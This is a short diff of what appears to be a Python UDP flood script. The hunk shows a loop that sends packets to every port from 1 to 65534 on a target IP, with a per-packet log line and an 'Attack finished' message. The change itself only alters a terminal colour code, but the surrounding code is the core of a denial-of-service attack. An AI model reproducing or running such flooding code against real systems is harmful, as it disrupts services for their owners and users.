@@ -52,6 +52,6 @@ while True:
     for port in range(1, 65534):
         white.sendto(bytes, (ip, port))
         sent = sent + 1
-        print("\033[37mSend \033[32m%s \033[95m Packets to \033[92m%s \033[36mThrough port \033[97m%s " % (sent, ip, port))
+        print("\033[37mSend \033[32m%s \033[95m Packets to \033[92m%s \033[36mThrough port \033[33m%s " % (sent, ip, port))
 
 print("\033[1;92mAttack finished\033[0m")
